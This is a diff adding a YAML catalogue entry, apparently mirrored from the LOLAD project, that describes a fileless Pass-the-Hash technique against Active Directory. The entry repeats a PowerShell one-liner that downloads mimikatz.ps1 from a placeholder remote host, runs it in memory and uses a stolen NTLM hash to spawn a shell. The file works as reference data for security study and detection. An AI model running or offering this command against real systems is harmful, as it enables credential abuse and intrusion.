@@ -1,0 +1,84 @@
+id: lolad/UGFzcy10aGUtSGFzaCBBdHRhY2sgKEZpbGVsZXNzKQ/SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vc2Vydmlkb3JfcmVtb3RvL21pbWlrYXR6LnBzMScpOyBJbnZva2UtTWltaWthdHogLUNvbW1hbmQgJ3Nla3VybHNhOjpwdGggL3VzZXI6VXNlck5hbWUgL2RvbWFpbjpkb21haW4ubG9jYWwgL250bG06aGFzaCAvcnVuOnBvd2Vyc2hlbGwuZXhlJw/UG93ZXJTaGVsbCAoRmlsZWxlc3Mp
+type: technique
+platform: active-directory
+name: Pass-the-Hash Attack (Fileless)
+phases:
+- discovery
+capabilities:
+- discovery
+privilege_required: domain-user
+sources:
+- project: LOLAD
+  upstream_url: https://lolad-project.github.io
+  license: verify upstream LICENSE
+  upstream_version: 6ed6a258f6e5a4692cec07f9692ed097551e04e5
+  last_synced: '2026-11-13'
+commands:
+- template: IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz
+    -Command 'sekurlsa::pth /user:UserName /domain:domain.local /ntlm:hash /run:powershell.exe'
+references:
+- https://lolad-project.github.io
+tags:
+- active-directory
+- lolad
+- powershell (fileless)
+source_data:
+  LOLAD:
+    raw:
+      name: Pass-the-Hash Attack (Fileless)
+      command: IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz
+        -Command 'sekurlsa::pth /user:UserName /domain:domain.local /ntlm:hash /run:powershell.exe'
+      type: PowerShell (Fileless)
+      reference: AkimboCore - Mimikatz
+      physical_rows:
+      - input_ref: index.html#row=111
+        row_utf8: "<tr>\r\n\t\t    <td>Pass-the-Hash Attack (Fileless)</td>\r\n\t\t    <td><code>IEX (New-Object\
+          \ Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz -Command\
+          \ 'sekurlsa::pth /user:UserName /domain:domain.local /ntlm:hash /run:powershell.exe'</code></td>\r\
+          \n\t\t    <td>PowerShell (Fileless)</td>\r\n\t\t    <td><a href=\"https://akimbocore.com/article/privilege-escalation-extracting-passwords-with-mimikatz/\"\
+          \ target=\"_blank\">AkimboCore - Mimikatz</a></td>\r\n\t\t</tr>"
+        row_sha256: sha256:d8e4c8bafb2ef488d19f64fb69cbb94a27ab55631608d67fd4607948b6b9b8c9
+        cells:
+        - Pass-the-Hash Attack (Fileless)
+        - IEX (New-Object Net.WebClient).DownloadString('http://servidor_remoto/mimikatz.ps1'); Invoke-Mimikatz
+          -Command 'sekurlsa::pth /user:UserName /domain:domain.local /ntlm:hash /run:powershell.exe'
+        - PowerShell (Fileless)
+        - AkimboCore - Mimikatz
+      physical_occurrence_count: 1
+    upstream_url: https://lolad-project.github.io
+    upstream_version: 6ed6a258f6e5a4692cec07f9692ed097551e04e5
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: discovery
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a258f6e5a4692cec07f9692ed097551e04e5
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+  phases:
+  - value: discovery
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a258f6e5a4692cec07f9692ed097551e04e5
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: heuristic
+      source: LOLAD
+      adapter: lolad@6ed6a258f6e5a4692cec07f9692ed097551e04e5
+      note: classified heuristically from technique name/command
+    confidence:
+      level: low
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLAD: sha256:fffa7f562870015f44f0a930607db5917e7f7ca10cc80cdff2be40a3d6c69ebc
